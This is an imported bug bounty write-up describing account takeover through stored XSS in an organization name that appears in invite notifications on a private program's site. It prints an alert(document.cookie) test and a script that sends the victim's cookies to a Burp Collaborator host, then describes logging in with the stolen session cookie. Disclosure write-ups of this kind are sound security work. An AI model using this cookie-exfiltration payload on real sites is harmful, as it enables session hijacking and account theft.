---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-07-30_account-takeover-via-stored-xss.md
original_filename: 2021-07-30_account-takeover-via-stored-xss.md
title: Account takeover via stored xss
category: documents
detected_topics:
- xss
- access-control
- command-injection
- otp
tags:
- imported
- documents
- xss
- access-control
- command-injection
- otp
language: en
raw_sha256: 231196190f7a4a3bebec2309a5589e7ead3d21d62b52f289ba217bcabf509511
text_sha256: 3203ea0d2803da2d909631f0f7dacbd027c96ebc0afc50dc800700a8ffcc601d
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Account takeover via stored xss

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-07-30_account-takeover-via-stored-xss.md
- Source Type: markdown
- Detected Topics: xss, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `231196190f7a4a3bebec2309a5589e7ead3d21d62b52f289ba217bcabf509511`
- Text SHA256: `3203ea0d2803da2d909631f0f7dacbd027c96ebc0afc50dc800700a8ffcc601d`


## Content

---
title: "Account takeover via stored xss"
url: "https://medium.com/@vikramroot/account-takeover-via-stored-xss-b774f7a2a3ab"
authors: ["vikram naidu (@ImVikram7msd)"]
bugs: ["Stored XSS"]
bounty: "1,000"
publication_date: "2021-07-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3463
scraped_via: "browseros"
---

# Account takeover via stored xss

Account takeover via stored xss
vikram naidu
Follow
3 min read
·
Jul 29, 2021

378

1

Hi everyone! This is Vikram Naidu, Bug bounty hunter from India. Hope you all are safe. This is my first writeup and it is about my recent finding on a private program where I was able to completely takeover any users, employee, admins accounts just by sending an invite email.

We will refer the website as Target.com . So the target.com has a many features like creating an organization, inviting users to the organization, assigning different roles to each user, etc. After seeing all these features, I decided to hunt on it for finding privilege escalation (PE)vulnerabilities. I signed up for an account and directly went to the feature of creating an organization. I have given organization name and observed that this input is reflected at many parts of website, so quick change of plans to find xss . I renamed the organization name to <script>alert(document.cookie)</script> and visited all the possible endpoints where the text is reflected, but unfortunately no XSS was triggered. I renamed the organization name to xyz and moved on to inviting user feature to check for PE .

As soon as I logged in to my second account in chrome, there is a notification on top saying :

If you observe the notification, yes the company name is stored and being reflected in the 2nd account where the invite was received.

Well, now you all know what to do . I instantly went back to 1st account and changed the organization name to <script>alert(document.cookie)</script> to check if xss will trigger and guess what ?

The xss is triggered and all the cookies are popped. Here in the cookies, the authentication token which is responsible for user session is also popped. While logging into my account I have checked via burp that this set-cookie is only thing which is responsible for user session.

Press enter or click to view image in full size

To takeover the victims account ,I need to get hold of this cookie value. I decided to modify the payload such a way that the cookies are redirected to attacker controlled server. I have read many other writeups and understood few payloads.

Get vikram naidu’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Opened burp-collaborator-client and modified the payload to : <script>new Image().src=”http://burp.burpcollaborator.net/abc.php?output="+document.cookie;</script> . Used this payload and sent invite to the victim. as soon as the victim logged into his account, xss is triggered and my burp collaborator received http request with cookie details of victim.

Press enter or click to view image in full size

As you can see in the request, we are receiving all the cookies. Noted down the authentication cookie and replaced with my cookie while logging in and I am directly logged in to victim account.

Note : In order to takeover any account you just need to enter their email and send invite. whenever they login to the account, the attacker will receive cookies.

Reported this vulnerability on 21st July . They patched and rewarded bounty on the same day.

LinkedIn

Bugcrowd
